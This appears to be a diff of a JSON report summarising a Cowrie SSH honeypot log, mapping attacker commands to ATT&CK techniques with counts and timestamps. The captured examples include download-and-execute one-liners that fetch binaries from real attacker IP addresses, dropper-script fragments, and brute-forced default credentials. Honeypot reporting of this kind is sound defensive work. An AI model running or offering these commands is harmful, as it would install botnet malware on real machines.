@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-25 21:00:46",
+  "generated": "2026-09-25 22:03:13",
   "totals": {
-    "commands": 3944,
-    "login_failed": 5827,
-    "login_success": 366,
-    "sessions": 6680
+    "commands": 4076,
+    "login_failed": 6547,
+    "login_success": 379,
+    "sessions": 7412
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 5827,
+      "count": 6547,
       "examples": [
         "root / casa",
         "root / router",
@@ -21,14 +21,14 @@
         "Admin / "
       ],
       "first": "2026-09-25T00:01:09.150965Z",
-      "last": "2026-09-25T21:00:41.057539Z",
-      "unique_ips": 156
+      "last": "2026-09-25T22:03:09.763793Z",
+      "unique_ips": 160
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 1382,
+      "count": 1437,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,14 +37,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-25T00:02:44.887220Z",
-      "last": "2026-09-25T20:51:49.646663Z",
-      "unique_ips": 97
+      "last": "2026-09-25T21:56:13.277938Z",
+      "unique_ips": 99
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 436,
+      "count": 437,
       "examples": [
         "uname -a",
         "cat /proc/cpuinfo",
@@ -53,14 +53,14 @@
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
       ],
       "first": "2026-09-25T00:11:42.471742Z",
-      "last": "2026-09-25T20:14:48.430173Z",
-      "unique_ips": 62
+      "last": "2026-09-25T21:28:15.440380Z",
+      "unique_ips": 63
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 366,
+      "count": 379,
       "examples": [
         "root / root",
         "adm / adm",
@@ -69,14 +69,14 @@
         "admin / password"
       ],
       "first": "2026-09-25T00:02:39.589537Z",
-      "last": "2026-09-25T20:51:47.250941Z",
-      "unique_ips": 131
+      "last": "2026-09-25T21:56:11.067216Z",
+      "unique_ips": 135
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 160,
+      "count": 177,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -85,8 +85,8 @@
         "cd /tmp||cd /var/tmp||cd /; (wget -q -O- http://176.65.139.196/bins/kla.sh | sh || curl -s http://176.65.139.196/bins/kl"
       ],
       "first": "2026-09-25T00:20:41.496654Z",
-      "last": "2026-09-25T20:40:57.409656Z",
-      "unique_ips": 64
+      "last": "2026-09-25T21:16:36.268198Z",
+      "unique_ips": 65
     },
     {
       "id": "T1083",
@@ -177,13 +177,14 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 4,
+      "count": 5,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "nohup $SHELL -c \"curl http://220.180.99.71:60105/linux -o /tmp/nHM6lfO9yt; if [ ! -f /tmp/nHM6lfO9yt ]; then wget http:/"
       ],
       "first": "2026-09-25T02:35:37.547616Z",
-      "last": "2026-09-25T18:19:29.106172Z",
-      "unique_ips": 4
+      "last": "2026-09-25T21:16:36.268198Z",
+      "unique_ips": 5
     },
     {
       "id": "T1087.001",
@@ -208,6 +209,18 @@
       "first": "2026-09-25T00:11:41.675158Z",
       "last": "2026-09-25T07:16:32.880877Z",
       "unique_ips": 2
+    },
+    {
+      "id": "T1095",
+      "name": "Non-Application Layer Protocol",
+      "tactic": "Command and Control",
+      "count": 1,
+      "examples": [
+        "nohup $SHELL -c \"curl http://220.180.99.71:60105/linux -o /tmp/nHM6lfO9yt; if [ ! -f /tmp/nHM6lfO9yt ]; then wget http:/"
+      ],
+      "first": "2026-09-25T21:16:36.268198Z",
+      "last": "2026-09-25T21:16:36.268198Z",
+      "unique_ips": 1
     },
     {
       "id": "T1140",
@@ -237,31 +250,31 @@
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      297
+      309
     ],
     [
       "sh",
-      266
+      274
     ],
     [
       "system",
-      264
+      272
     ],
     [
       "shell",
-      211
+      219
     ],
     [
       "enable",
-      207
+      215
     ],
     [
       "ping; sh",
-      198
+      206
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      99
+      103
     ],
     [
       "/bin/busybox",
@@ -272,19 +285,35 @@
       16
     ],
     [
+      "echo '#!/bin/sh' > .s",
+      8
+    ],
+    [
+      "sh .s; rm -f .s",
+      8
+    ],
+    [
+      "exit",
+      8
+    ],
+    [
       "root",
       6
     ],
     [
-      "echo '#!/bin/sh' > .s",
+      "echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s",
       6
     ],
     [
-      "sh .s; rm -f .s",
+      "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s",
       6
     ],
     [
-      "exit",
+      "echo 'done' >> .s",
+      6
+    ],
+    [
+      "echo 'rm -f .c $a' >> .s",
       6
     ],
     [
@@ -297,22 +326,6 @@
     ],
     [
       "enablelinuxshell",
-      4
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      4
-    ],
-    [
-      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
-      4
-    ],
-    [
-      "echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s",
-      4
-    ],
-    [
-      "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s",
       4
     ]
   ]
